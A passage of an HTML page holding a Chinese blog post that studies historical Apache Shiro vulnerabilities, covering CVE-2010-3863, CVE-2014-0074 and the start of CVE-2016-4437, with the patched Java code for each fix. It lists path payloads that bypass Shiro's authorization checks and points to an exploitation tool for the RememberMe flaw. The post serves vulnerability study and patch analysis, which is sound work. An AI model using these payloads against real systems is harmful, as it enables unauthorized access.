href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-9"><span class="nav-number">11.4.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2021-41303"><span class="nav-number">12.</span> <span class="nav-text">CVE-2021-41303</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF-10"><span class="nav-number">12.1.</span> <span class="nav-text">漏洞信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-10"><span class="nav-number">12.2.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-10"><span class="nav-number">12.3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-10"><span class="nav-number">12.4.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2022-32532"><span class="nav-number">13.</span> <span class="nav-text">CVE-2022-32532</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF-11"><span class="nav-number">13.1.</span> <span class="nav-text">漏洞信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-11"><span class="nav-number">13.2.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-11"><span class="nav-number">13.3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-11"><span class="nav-number">13.4.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">14.</span> <span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="kpa1on"
+      src="/img/96.ico">
+  <p class="site-author-name" itemprop="name">kpa1on</p>
+  <div class="site-description" itemprop="description">kpa1on的博客</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">40</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/kpa1on" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;kpa1on" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:l2kpa1on@gmail.com" title="E-Mail → mailto:l2kpa1on@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license site-overview-item animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdn.jsdelivr.net/npm/@creativecommons/vocabulary@2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.wangan.com/docs/javasec" title="https:&#x2F;&#x2F;www.wangan.com&#x2F;docs&#x2F;javasec" rel="noopener" target="_blank">Java安全</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://javasec.org/" title="https:&#x2F;&#x2F;javasec.org&#x2F;" rel="noopener" target="_blank">JavaSec</a>
+        </li>
+    </ul>
+  </div>
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+  <a href="https://github.com/kpa1on" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://kpa1on.github.io/2022/09/26/shiro%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/img/96.ico">
+      <meta itemprop="name" content="kpa1on">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="kpa1on's Blog">
+      <meta itemprop="description" content="kpa1on的博客">
+    </span>
+    
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="shiro历史漏洞学习 | kpa1on's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          shiro历史漏洞学习
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-09-26 11:21:23" itemprop="dateCreated datePublished" datetime="2022-09-26T11:21:23+08:00">2022-09-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-09-29 15:42:04" itemprop="dateModified" datetime="2022-09-29T15:42:04+08:00">2022-09-29</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Java%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Java安全</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>70k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>1:03</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <meta name="referrer" content="no-referrer"/>
+
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近整理了一些权限绕过的payload，所以就过一下shiro的历史漏洞。</p>
+<h3 id="CVE-2010-3863"><a href="#CVE-2010-3863" class="headerlink" title="CVE-2010-3863"></a>CVE-2010-3863</h3><h4 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><table>
+<thead>
+<tr>
+<th align="left">漏洞信息</th>
+<th align="left">详情</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">漏洞编号</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3863">CVE-2010-3863</a> &#x2F; <a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/flaw/show/CNVD-2010-2715">CNVD-2010-2715</a></td>
+</tr>
+<tr>
+<td align="left">影响版本</td>
+<td align="left">shiro &lt; 1.1.0 &amp; JSecurity 0.9.x</td>
+</tr>
+<tr>
+<td align="left">漏洞描述</td>
+<td align="left">Shiro 在对请求路径与 shiro.ini 配置文件配置的 AntPath 进行对比前 未进行路径标准化，导致使用时可能绕过权限校验</td>
+</tr>
+<tr>
+<td align="left">漏洞关键字</td>
+<td align="left">&#x2F;.&#x2F; | 路径标准化</td>
+</tr>
+<tr>
+<td align="left">漏洞补丁</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/ab8294940a19743583d91f0c7e29b405d197cc34">Commit-ab82949</a></td>
+</tr>
+<tr>
+<td align="left">相关链接</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://vulners.com/nessus/SHIRO_SLASHDOT_BYPASS.NASL">https://vulners.com/nessus/SHIRO_SLASHDOT_BYPASS.NASL</a> <a target="_blank" rel="noopener" href="https://marc.info/?l=bugtraq&amp;m=128880520013694&amp;w=2">https://marc.info/?l=bugtraq&amp;m=128880520013694&amp;w=2</a></td>
+</tr>
+</tbody></table>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>环境的搭建采用的这个作者的</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Xxy605/article/details/125404334">https://blog.csdn.net/Xxy605/article/details/125404334</a></p>
+<p>搭建好后，直接访问secret.html是需要权限校验的，权限不通过就会跳转到登录</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261151851.png" alt="image-20220926115157770"></p>
+<p>在路径中添加特殊字符即可绕过权限校验</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261153989.png" alt="image-20220926115335873"></p>
+<p>当然不止这个字符，这里直接用上我的权限绕过字典</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261205560.png" alt="image-20220926120513350"></p>
+<p>跑出的结果整理出来大致有如下payload可以绕过（当然可能还要其他的）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">;</span><br><span class="line">.</span><br><span class="line">a.ico/../</span><br><span class="line">%2e</span><br><span class="line">%3b/%2e.</span><br><span class="line">%3b/..</span><br><span class="line">js/..;/</span><br></pre></td></tr></table></figure>
+
+<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>Shiro 使用 <code>PathMatchingFilterChainResolver#getChain</code> 方法获取和调用要执行的过滤器</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261421084.png" alt="image-20220926142145921"></p>
+<p>然后进入else语句通过<code>PathMatchingFilterChainResolver#getPathWithinApplication</code>获取<code>requestURI</code>，跟进</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261432397.png" alt="image-20220926143206319"></p>
+<p>继续跟进，如下调用<code>WebUtils#getRequestUri</code>处理<code>request</code>获取<code>requestUri</code>，然后使用字符串截取的方式，去掉URI中的contextPath，跟进<code>getRequestUri</code>这个函数</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261434159.png" alt="image-20220926143413096"></p>
+<p>将获取的uri传递到<code>WebUtils#decodeAndCleanUriString</code>中</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261436435.png" alt="image-20220926143602338"></p>
+<p>整个方法就是去除URI中的“;”</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261446899.png" alt="image-20220926144625832"></p>
+<p><code>decodeRequestString</code>做了url解码操作</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261438656.png" alt="image-20220926143810483"></p>
+<p>返回URI路径之后，然后循环配置中的AntPath，判断URI和配置路径是否匹配</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261439537.png" alt="image-20220926143915441"></p>
+<p>然后将处理之后的URI传入<code>AntPathMatcher#doMatch</code>进行匹配，在上面的处理期间未做路径标准化处理，导致URI中如果存在一些特殊字符，就有可能导致权限绕过。</p>
+<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>查看补丁链接 <a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/ab8294940a19743583d91f0c7e29b405d197cc34">Commit-ab82949</a>，在补丁中新增了<code>normalize</code>方法来对路径进行标准化处理</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261452874.png" alt="image-20220926145256733"></p>
+<p><code>normalize</code>方法大致如下，可以看到对URI中的 <code>\\</code>、<code>//</code>、<code>/./</code>、<code>/../</code>进行处理</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">normalize</span><span class="params">(String path, <span class="type">boolean</span> replaceBackSlash)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (path == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Create a place for the normalized path</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">normalized</span> <span class="operator">=</span> path;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (replaceBackSlash &amp;&amp; normalized.indexOf(<span class="string">&#x27;\\&#x27;</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">            normalized = normalized.replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (normalized.equals(<span class="string">&quot;/.&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;/&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Add a leading &quot;/&quot; if necessary</span></span><br><span class="line">        <span class="keyword">if</span> (!normalized.startsWith(<span class="string">&quot;/&quot;</span>))</span><br><span class="line">            normalized = <span class="string">&quot;/&quot;</span> + normalized;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Resolve occurrences of &quot;//&quot; in the normalized path</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> normalized.indexOf(<span class="string">&quot;//&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (index &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            normalized = normalized.substring(<span class="number">0</span>, index) +</span><br><span class="line">                normalized.substring(index + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Resolve occurrences of &quot;/./&quot; in the normalized path</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> normalized.indexOf(<span class="string">&quot;/./&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (index &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            normalized = normalized.substring(<span class="number">0</span>, index) +</span><br><span class="line">                normalized.substring(index + <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Resolve occurrences of &quot;/../&quot; in the normalized path</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> normalized.indexOf(<span class="string">&quot;/../&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (index &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">if</span> (index == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> (<span class="literal">null</span>);  <span class="comment">// Trying to go outside our context</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">index2</span> <span class="operator">=</span> normalized.lastIndexOf(<span class="string">&#x27;/&#x27;</span>, index - <span class="number">1</span>);</span><br><span class="line">            normalized = normalized.substring(<span class="number">0</span>, index2) +</span><br><span class="line">                normalized.substring(index + <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Return the normalized path that we have completed</span></span><br><span class="line">        <span class="keyword">return</span> (normalized);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="CVE-2014-0074"><a href="#CVE-2014-0074" class="headerlink" title="CVE-2014-0074"></a>CVE-2014-0074</h3><h4 id="漏洞信息-1"><a href="#漏洞信息-1" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><table>
+<thead>
+<tr>
+<th align="left">漏洞信息</th>
+<th align="left">详情</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">漏洞编号</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0074">CVE-2014-0074</a> &#x2F; <a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/flaw/show/CNVD-2014-03861">CNVD-2014-03861</a> &#x2F; <a target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/SHIRO-460">SHIRO-460</a></td>
+</tr>
+<tr>
+<td align="left">影响版本</td>
+<td align="left">shiro 1.x &lt; 1.2.3</td>
+</tr>
+<tr>
+<td align="left">漏洞描述</td>
+<td align="left">当程序使用LDAP服务器并启用非身份验证绑定时，远程攻击者可借助空的用户名或密码利用该漏洞绕过身份验证。</td>
+</tr>
+<tr>
+<td align="left">漏洞关键字</td>
+<td align="left">ldap | 绕过 | 空密码 | 空用户名 | 匿名</td>
+</tr>
+<tr>
+<td align="left">漏洞补丁</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/f988846207f98c98ff24213ee9063798ea5d9b6c">Commit-f988846</a></td>
+</tr>
+<tr>
+<td align="left">相关链接</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/21391572/shiro-authenticates-non-existent-user-in-ldap">https://stackoverflow.com/questions/21391572/shiro-authenticates...in-ldap</a> <a target="_blank" rel="noopener" href="https://www.openldap.org/doc/admin24/security.html">https://www.openldap.org/doc/admin24/security.html</a></td>
+</tr>
+</tbody></table>
+<h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>暂无相关环境。</p>
+<h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>根据官方通告是 ldap 服务器在开启了 unauthenticated bind 之后会受到影响；利用的场景有两种：</p>
+<ul>
+<li>ldap unauthenticated bind enabled 的情况下，可以使用空用户名+任意密码进行认证。</li>
+<li>ldap allow anonymous 的情况下，可以空用户名+空密码的匿名访问进行认证。</li>
+</ul>
+<h4 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>查看补丁链接 <a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/f988846207f98c98ff24213ee9063798ea5d9b6c">f988846</a>，补丁中添加了<code>validateAuthenticationInfo</code>方法来针对这个漏洞进行修复</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Validates the configuration in the JNDI &lt;code&gt;environment&lt;/code&gt; settings and throws an exception if a problem</span></span><br><span class="line"><span class="comment">     * exists.</span></span><br><span class="line"><span class="comment">     * &lt;p/&gt;</span></span><br><span class="line"><span class="comment">     * This implementation will throw a &#123;<span class="doctag">@link</span> AuthenticationException&#125; if the authentication mechanism is set to</span></span><br><span class="line"><span class="comment">     * &#x27;simple&#x27;, the principal is non-empty, and the credentials are empty (as per</span></span><br><span class="line"><span class="comment">     * &lt;a href=&quot;http://tools.ietf.org/html/rfc4513#section-5.1.2&quot;&gt;rfc4513 section-5.1.2&lt;/a&gt;).</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> environment the JNDI environment settings to be validated</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> AuthenticationException if a configuration problem is detected</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">validateAuthenticationInfo</span><span class="params">(Hashtable&lt;String, Object&gt; environment)</span></span><br><span class="line">        <span class="keyword">throws</span> AuthenticationException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// validate when using Simple auth both principal and credentials are set</span></span><br><span class="line">        <span class="keyword">if</span>(SIMPLE_AUTHENTICATION_MECHANISM_NAME.equals(environment.get(Context.SECURITY_AUTHENTICATION))) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// only validate credentials if we have a non-empty principal</span></span><br><span class="line">            <span class="keyword">if</span>( environment.get(Context.SECURITY_PRINCIPAL) != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                StringUtils.hasText( String.valueOf( environment.get(Context.SECURITY_PRINCIPAL) ))) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="type">Object</span> <span class="variable">credentials</span> <span class="operator">=</span> environment.get(Context.SECURITY_CREDENTIALS);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// from the FAQ, we need to check for empty credentials:</span></span><br><span class="line">                <span class="comment">// http://docs.oracle.com/javase/tutorial/jndi/ldap/faq.html</span></span><br><span class="line">                <span class="keyword">if</span>( credentials == <span class="literal">null</span> ||</span><br><span class="line">                    (credentials <span class="keyword">instanceof</span> <span class="type">byte</span>[] &amp;&amp; ((<span class="type">byte</span>[])credentials).length &lt;= <span class="number">0</span>) || <span class="comment">// empty byte[]</span></span><br><span class="line">                    (credentials <span class="keyword">instanceof</span> <span class="type">char</span>[] &amp;&amp; ((<span class="type">char</span>[])credentials).length &lt;= <span class="number">0</span>) || <span class="comment">// empty char[]</span></span><br><span class="line">                    (String.class.isInstance(credentials) &amp;&amp; !StringUtils.hasText(String.valueOf(credentials)))) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">javax</span>.naming.AuthenticationException(<span class="string">&quot;LDAP Simple authentication requires both a &quot;</span></span><br><span class="line">                                                                       + <span class="string">&quot;principal and credentials.&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="CVE-2016-4437"><a href="#CVE-2016-4437" class="headerlink" title="CVE-2016-4437"></a>CVE-2016-4437</h3><h4 id="漏洞信息-2"><a href="#漏洞信息-2" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><table>
+<thead>
+<tr>
+<th align="left">漏洞信息</th>
+<th align="left">详情</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">漏洞编号</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0074">CVE-2016-4437</a> &#x2F; <a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/flaw/show/CNVD-2016-03869">CNVD-2016-03869</a> &#x2F; <a target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/SHIRO-550">SHIRO-550</a></td>
+</tr>
+<tr>
+<td align="left">影响版本</td>
+<td align="left">shiro 1.x &lt; 1.2.5</td>
+</tr>
+<tr>
+<td align="left">漏洞描述</td>
+<td align="left">如果程序未能正确配置 “remember me” 功能使用的密钥。 攻击者可通过发送带有特制参数的请求利用该漏洞执行任意代码或访问受限制内容。</td>
+</tr>
+<tr>
+<td align="left">漏洞关键字</td>
+<td align="left">cookie | RememberMe | 反序列化 | 硬编码 | AES</td>
+</tr>
+<tr>
+<td align="left">漏洞补丁</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/4d5bb000a7f3c02d8960b32e694a565c95976848">Commit-4d5bb00</a></td>
+</tr>
+<tr>
+<td align="left">相关链接</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/SHIRO-441">SHIRO-441</a> <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/192619">https://www.anquanke.com/post/id/192619</a></td>
+</tr>
+</tbody></table>
+<h4 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>环境是在CVE-2010-3863基础上修改的，搭建好后，访问登录页面</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261708084.png" alt="image-20220926170814849"></p>
+<p>随便输入用户名密码抓取数据包，在响应包中看到<code>remeberMe=deleteMe</code>即可判断出存在shiro框架</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261709878.png" alt="image-20220926170938700"></p>
+<p>使用工具进行漏洞探测和漏洞利用，工具地址：<a target="_blank" rel="noopener" href="https://github.com/SummerSec/ShiroAttack2">https://github.com/SummerSec/ShiroAttack2</a></p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261710343.png" alt="image-20220926171048126"></p>
+<p>可以看到存在CB链，但其实本项目在搭建的时候并没有引入其他的依赖，这里就是shiro自带的一条CB链了，后面再分析。</p>
